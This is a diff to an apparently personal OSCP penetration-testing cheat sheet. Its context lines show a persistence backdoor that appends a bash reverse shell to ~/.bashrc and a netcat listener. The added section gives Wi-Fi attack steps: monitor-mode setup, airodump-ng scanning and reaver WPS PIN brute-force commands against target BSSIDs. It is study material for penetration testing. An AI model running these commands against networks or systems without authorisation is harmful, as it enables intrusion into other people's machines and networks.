@@ -2,7 +2,7 @@
 The essential tools and procedure Kaoryu for OSCP  
 You can find important upload on top of page
 
-## Global RoadMap for Pentest _For Linux_
+## Global RoadMap to Pentest _For Linux_
 ### 1. Passive recognition
  - Command helpful for passive recognition 
 ```bash
@@ -377,3 +377,40 @@ echo 'bash -i >& /dev/tcp/<IP>/<port> >&1' >> ~/.bashrc #payload backdoor
 nc -lvnp <port> #on your machine who want connect
 ```
 ### 5. escalation privilege WINDOWS
+
+## Attacking WI-FI _(WPS,WPA,WPA2)_
+### Scan Network
+  
+first list our available wireless interfaces
+```bash
+iwconfig
+ifconfig
+```
+Once you have identify your interface, create a new virtual interface in monitor mode.  
+_Le mode moniteur permet à l'interface d'observer passivement tout le trafic Wi-Fi environnant, sans être associée à un point d'accès spécifique, ce qui est utile pour l'analyse de réseau, les tests de sécurité et le dépannage._
+```bash
+iw dev wlan0 interface add mon0 type monitor
+ifconfig man0 up
+#or
+airmon-ng start wlan0 #create wlan0mon
+```
+  
+**Scanning with Airodump-ng**  
+
+```bash
+airodump-ng --wps --ignore-negative-one wlan0mon
+airodump-ng --wps --ignore-negative-one -c 8 --bssid 60:38:E0:XX:XX:XX wlan0mon
+```
+
+### WPS attack
+ 
+#### **Online brut force with reaver :**    
+first basic brut force 11,000 PIN  
+second test null pin  
+third we already know 4 first number PIN  
+```bash
+sudo reaver -i man0 -b D8:D7:3D:XX:XX:XX -c 1
+sudo reaver -i man0 -b D8:D7:3D:XX:XX:XX -c 1 -p " "
+sudo reaver -i man0 -b D8:D7:3D:XX:XX:XX -c 1 -p "8487"
+```
+
